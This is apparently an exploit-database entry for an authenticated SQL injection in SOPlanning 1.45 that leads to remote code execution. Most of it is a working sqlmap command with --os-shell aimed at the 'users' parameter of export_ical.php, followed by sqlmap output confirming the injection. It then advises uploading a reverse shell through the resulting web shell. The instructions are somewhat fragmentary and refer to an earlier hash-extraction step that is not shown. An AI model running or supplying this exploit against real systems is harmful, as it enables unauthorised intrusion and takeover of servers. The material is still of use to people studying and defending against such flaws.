# Exploit Title: SOPlanning 1.45 - 'users' SQL Injection
# Date: 2020-02-14
# Exploit Author: J3rryBl4nks, Homebrewer

# Version 1.45
# Tested on Windows 10/Kali Rolling

The SOPlanning application is vulnerable to SQL Injection that leads to Remote Code Execution.

Exploit POC:

Once you have extracted the admin hash, you can now use that to get command execution on the machine through another SQL Injection.

Save the admin hash and insert it into SQLMap as such:

sqlmap -u 'http://HOSTHERE/soplanning/www/export_ical.php?login=admin&hash=HASHHERE&nocache&users=ADM&age=3' -p users --risk=3 --level=5 --threads=10 --dbms=mysql --keep-alive --os-shell\


Now you have a web shell uploaded to the server:

11:52:31] [INFO] GET parameter 'users' is 'MySQL UNION query (NULL) - 41 to 60 columns' injectable
GET parameter 'users' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2122 HTTP(s) requests:

Using that webshell you can upload your reverse shell.
